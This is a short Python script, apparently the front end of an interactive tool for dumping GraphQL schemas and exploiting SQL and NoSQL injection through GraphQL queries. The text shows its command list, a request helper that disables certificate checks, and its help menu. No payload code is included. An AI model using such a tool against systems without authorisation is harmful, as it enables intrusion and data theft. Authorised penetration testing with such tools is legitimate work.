#!/usr/bin/python
import argparse
import json
import re
import readline
import requests
import sys
import time

cmdlist  = ["exit", "help", "dump_old", "dump_new", "postgresqli", "mysqli", "mssqli", "nosqli", "mutation", "edges", "node", "$regex", "$ne", "__schema"]

def auto_completer(text, state):
    options = [x for x in cmdlist if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None


def jq(data):
    return json.dumps(data, indent=4, sort_keys=True)


def requester(URL, method, payload):
    if method == "POST":
        data = {
            "query": payload.replace("+", " ")
        }
        r = requests.post(URL, data=data, verify=False)
        if r.status_code == 500:
            print("\033[91m/!\ API didn't respond correctly to a POST method !\033[0m")
            return None
    else:
        r = requests.get( URL+"?query={}".format(payload), verify=False)
    return r


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', action ='store', dest='url',  help="URL to query : example.com/graphql?query={}")
    parser.add_argument('-v', action ='store', dest='verbosity', help="Enable verbosity", nargs='?', const=True)
    parser.add_argument('--method', action ='store', dest='method', help="HTTP Method to use interact with /graphql endpoint", nargs='?',  const=True, default="GET")
    results = parser.parse_args() 
    if results.url == None:
        parser.print_help()
        exit()
    return results


def display_help():
    print("[+] \033[92mdump_old    \033[0m: dump GraphQL schema (fragment+FullType)")
    print("[+] \033[92mdump_new    \033[0m: dump GraphQL schema (IntrospectionQuery)")
    print("[+] \033[92mnosqli      \033[0m: exploit a nosql injection inside a GraphQL query")
    print("[+] \033[92mpostgresqli \033[0m: exploit a sql injection inside a GraphQL query")
    print("[+] \033[92mysqli       \033[0m: exploit a sql injection inside a GraphQL query")
    print("[+] \033[92mssqli       \033[0m: exploit a sql injection inside a GraphQL query")
    print("[+] \033[92mexit        \033[0m: gracefully exit the application")
